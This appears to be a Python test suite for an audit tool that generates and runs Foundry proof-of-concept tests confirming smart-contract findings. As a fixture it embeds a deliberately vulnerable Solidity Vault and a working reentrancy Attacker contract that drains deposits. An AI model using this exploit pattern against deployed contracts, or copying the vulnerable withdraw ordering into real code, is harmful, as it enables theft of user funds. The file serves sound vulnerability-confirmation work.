import importlib.util
import hashlib
import json
from pathlib import Path
import tempfile
import unittest

ROOT = Path(__file__).resolve().parents[1]
GEN_SPEC = importlib.util.spec_from_file_location('poc_generator', ROOT / 'scripts' / 'poc_generator.py')
GEN = importlib.util.module_from_spec(GEN_SPEC)
GEN_SPEC.loader.exec_module(GEN)
RUN_SPEC = importlib.util.spec_from_file_location('poc_runner', ROOT / 'scripts' / 'poc_runner.py')
RUN = importlib.util.module_from_spec(RUN_SPEC)
RUN_SPEC.loader.exec_module(RUN)


def project(directory, *, vulnerable=True):
    finding = {'id': 'finding-reentrancy-1'}
    withdraw_body = ('(bool ok,) = msg.sender.call{value: amount}(""); require(ok); balances[msg.sender] = 0;'
                     if vulnerable else 'balances[msg.sender] = 0; (bool ok,) = msg.sender.call{value: amount}(""); require(ok);')
    vault = '''pragma solidity >=0.8.19;
contract Vault {
    mapping(address => uint256) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        %s
    }
}
''' % withdraw_body
    bundle = {'sources': {'Vault.sol': {'content': vault}}}
    output = Path(directory) / 'poc'
    name = f"testPoC_{hashlib.sha256(finding['id'].encode()).hexdigest()[:16]}"
    test_source = f'''pragma solidity >=0.8.19;
import "../src/Vault.sol";
contract Attacker {{
    Vault immutable vault;
    constructor(Vault target) {{ vault = target; }}
    function attack() external payable {{ vault.deposit{{value: msg.value}}(); vault.withdraw(); }}
    receive() external payable {{ if (address(vault).balance >= 1 ether) vault.withdraw(); }}
}}
contract Poc {{
    function {name}() public {{
        Vault vault = new Vault();
        vault.deposit{{value: 1 ether}}();
        Attacker attacker = new Attacker(vault);
        attacker.attack{{value: 1 ether}}();
        require(address(vault).balance == 0, "reentrancy drains victim deposit");
    }}
}}'''
    GEN.generate_poc(finding, bundle, output, test_source=test_source)
    return output, name


class PocRunnerTests(unittest.TestCase):
    def test_only_explicit_foundry_pass_confirms_poc(self):
        forge = ROOT / 'work' / 'tools' / 'forge'
        if not forge.is_file():
            self.skipTest('bundled forge binary is unavailable')
        with tempfile.TemporaryDirectory() as directory:
            path, test_name = project(directory)
            result = RUN.run_poc(path, forge=forge)
            self.assertEqual(result['pocState'], 'confirmed')
            self.assertTrue(result['confirmedVulnerability'])
            self.assertEqual(result['attempts'][0]['state'], 'confirmed')
            self.assertIn(test_name, (Path(result['pocArtifactPath'])).read_text())

    def test_false_positive_runs_three_attempts_and_stays_unconfirmed(self):
        with tempfile.TemporaryDirectory() as directory:
            path, _ = project(directory, vulnerable=False)
            attempts = []

            def retry(context):
                attempts.append(context['attempt'])
                return (path / json.loads((path / 'poc.json').read_text())['testPath']).read_text()

            forge = ROOT / 'work' / 'tools' / 'forge'
            result = RUN.run_poc(path, forge=forge, repair_callback=retry, max_repairs=2)
            self.assertEqual(result['pocState'], 'unconfirmed')
            self.assertFalse(result['confirmedVulnerability'])
            self.assertEqual(len(result['attempts']), 3)
            self.assertEqual(attempts, [1, 2])
            self.assertEqual(json.loads((path / 'poc-result.json').read_text())['pocState'], 'unconfirmed')

    def test_capital_search_uses_only_read_only_probe(self):
        calls = []
        value = RUN.binary_search_minimum_capital(lambda amount: calls.append(amount) or amount >= 17,
                                                   0, 100)
        self.assertEqual(value, 17)
        self.assertTrue(calls)
        self.assertLessEqual(len(calls), 8)


if __name__ == '__main__':
    unittest.main()
